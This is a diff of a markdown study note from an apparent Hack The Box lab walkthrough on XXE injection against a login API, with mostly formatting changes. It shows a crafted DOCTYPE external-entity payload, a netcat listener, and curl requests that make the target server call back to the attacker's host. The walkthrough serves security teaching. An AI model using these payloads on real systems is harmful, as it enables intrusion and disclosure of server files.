@@ -1,18 +1,15 @@
 ---
 sticker: emoji//1f480
 ---
-
-# XML External Entity (XXE) Injection
-
-XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down. Our [Web Attacks](https://academy.hackthebox.com/module/details/134) module covers XXE Injection vulnerabilities in detail. It should be noted that XXE vulnerabilities affect web applications and APIs alike.
+XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down. Our [Web Attacks](https://academy.hackthebox.com/module/details/134) module covers XXE Injection vulnerabilities in detail. It should be noted that XXE vulnerabilities affect web applications and APIs alike.
 
 Let us assess together an API that is vulnerable to XXE Injection.
 
-Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along.
+Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along.
 
-Suppose we are assessing such an application residing in `http://<TARGET IP>:3001`.
+Suppose we are assessing such an application residing in `http://<TARGET IP>:3001`.
 
-By the time we browse `http://<TARGET IP>:3001`, we come across an authentication page.
+By the time we browse `http://<TARGET IP>:3001`, we come across an authentication page.
 
 Run Burp Suite as follows.
 
@@ -25,6 +22,7 @@ Activate burp suite's proxy (_Intercept On_) and configure your browser to go th
 Now let us try authenticating. We should see the below inside Burp Suite's proxy.
 
 ![image](https://academy.hackthebox.com/storage/modules/160/11.png)
+
 
 ```http
 POST /api/login/ HTTP/1.1
@@ -44,10 +42,10 @@ Sec-GPC: 1
 <?xml version="1.0" encoding="UTF-8"?><root><email>test@test.com</email><password>P@ssw0rd123</password></root>
 ```
 
-* We notice that an API is handling the user authentication functionality of the application.
-* User authentication is generating XML data.
+- We notice that an API is handling the user authentication functionality of the application.
+- User authentication is generating XML data.
 
-Let us try crafting an exploit to read internal files such as _/etc/passwd_ on the server.
+Let us try crafting an exploit to read internal files such as _/etc/passwd_ on the server.
 
 First, we will need to append a DOCTYPE to this request.
 
@@ -56,6 +54,7 @@ What is a DOCTYPE?
 DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document. A DOCTYPE declaration can also be used to define special characters or strings used in the document. The DTD is declared within the optional DOCTYPE element at the start of the XML document. Internal DTDs exist, but DTDs can be loaded from an external resource (external DTD).
 
 Our current payload is:
+
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -66,11 +65,12 @@ Our current payload is:
 </root>
 ```
 
-We defined a DTD called _pwn_, and inside of that, we have an `ENTITY`. We may also define custom entities (i.e., XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data. This can be done using the ENTITY keyword, followed by the `ENTITY` name and its value.
+We defined a DTD called _pwn_, and inside of that, we have an `ENTITY`. We may also define custom entities (i.e., XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data. This can be done using the ENTITY keyword, followed by the `ENTITY` name and its value.
 
-We have called our external entity _somename_, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as `file://` to call internal files.
+We have called our external entity _somename_, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as `file://` to call internal files.
 
 Let us set up a Netcat listener as follows.
+
 
 ```shell-session
 smoothment@htb[/htb]$ nc -nlvp 4444
@@ -79,12 +79,14 @@ listening on [any] 4444 ...
 
 Now let us make an API call containing the payload we crafted above.
 
+
 ```shell-session
 smoothment@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
 <p>Sorry, we cannot find a account with <b></b> email.</p>
 ```
 
 We notice no connection being made to our listener. This is because we have defined our external entity, but we haven't tried to use it. We can do that as follows.
+
 
 ```shell-session
 smoothment@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
@@ -104,8 +106,7 @@ Connection: close
 
 The API is vulnerable to XXE Injection.
 
-## Question
+# Question
+---
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250219172306.png)
 
-***
-
-![](gitbook/cybersecurity/images/Pasted%20image%2020250219172306.png)
